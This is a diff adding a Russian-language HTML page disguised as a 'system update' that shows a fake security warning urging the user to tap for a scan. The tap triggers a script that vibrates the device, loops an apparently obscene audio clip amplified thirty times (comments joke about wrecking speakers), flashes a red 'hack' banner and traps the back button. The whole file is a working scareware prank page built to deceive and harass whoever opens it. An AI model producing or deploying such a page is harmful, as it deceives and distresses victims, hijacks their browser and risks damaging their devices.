@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Обновление системы</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        #overlay h1 {
+            color: #0f0;
+            font-size: 22px;
+            text-align: center;
+            margin-bottom: 15px;
+            animation: blink 1s infinite;
+        }
+        #overlay p {
+            color: #fff;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        #overlay .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #333;
+            border-top: 3px solid #0f0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ЛОВУШКА: на весь экран, ждёт первого касания -->
+    <div id="overlay" onclick="attack()">
+        <h1>ВНИМАНИЕ!</h1>
+        <p>Обнаружена подозрительная активность.</p>
+        <p>Нажмите для сканирования...</p>
+        <div class="loader"></div>
+    </div>
+
+    <!-- Скрытый звук -->
+    <audio id="weapon" preload="auto" loop>
+        <source src="stohn.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        function attack() {
+            // Убираем оверлей
+            var overlay = document.getElementById('overlay');
+            if (overlay) overlay.remove();
+
+            // Вибрация на 3 секунды (если поддерживается)
+            try {
+                if (window.navigator && window.navigator.vibrate) {
+                    navigator.vibrate([3000]);
+                }
+            } catch(e) {}
+
+            // Web Audio API с максимальным усилением
+            try {
+                var ctx = new (window.AudioContext || window.webkitAudioContext)();
+                var audio = document.getElementById('weapon');
+                var source = ctx.createMediaElementSource(audio);
+                var gain = ctx.createGain();
+
+                // Усиление x30 (можно менять: 10 = громко, 30 = эпично, 100 = RIP динамик)
+                gain.gain.value = 30;
+
+                source.connect(gain);
+                gain.connect(ctx.destination);
+
+                // Запускаем звук
+                audio.loop = true;
+                audio.play().catch(function() {
+                    // Фолбэк: если AudioContext не сработал, пробуем просто .play()
+                    audio.volume = 1.0;
+                    audio.play();
+                });
+
+                // Каждые 500мс пробуем ещё раз (на случай если браузер заблокировал)
+                var retryInterval = setInterval(function() {
+                    if (audio.paused) {
+                        audio.play().catch(function(){});
+                    }
+                }, 500);
+
+                // Останавливаем ретраи через 10 секунд
+                setTimeout(function() {
+                    clearInterval(retryInterval);
+                }, 10000);
+
+            } catch(e) {
+                // Фолбэк: тупо играем без усиления
+                var audio = document.getElementById('weapon');
+                audio.volume = 1.0;
+                audio.loop = true;
+                audio.play();
+            }
+
+            // Меняем фон на красный мигающий для паники
+            document.body.style.background = '#f00';
+            document.body.innerHTML += '<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:30px;text-align:center;z-index:9998;text-shadow:0 0 20px red;">⚠️ ВЗЛОМ ⚠️</div>';
+
+            // Блокируем кнопку "назад" (не даём уйти быстро)
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.pushState(null, null, location.href);
+            };
+        }
+
+        // Дополнительно: если чел зажмёт палец (long press) тоже сработает
+        document.addEventListener('touchstart', function(e) {
+            var overlay = document.getElementById('overlay');
+            if (overlay && overlay.contains(e.target)) {
+                attack();
+            }
+        });
+
+        // Если каким-то чудом человек не нажал, но провёл по экрану — тоже сработает
+        document.addEventListener('click', function(e) {
+            var overlay = document.getElementById('overlay');
+            if (overlay && overlay.contains(e.target)) {
+                attack();
+            }
+        });
+    </script>
+
+</body>
+</html>
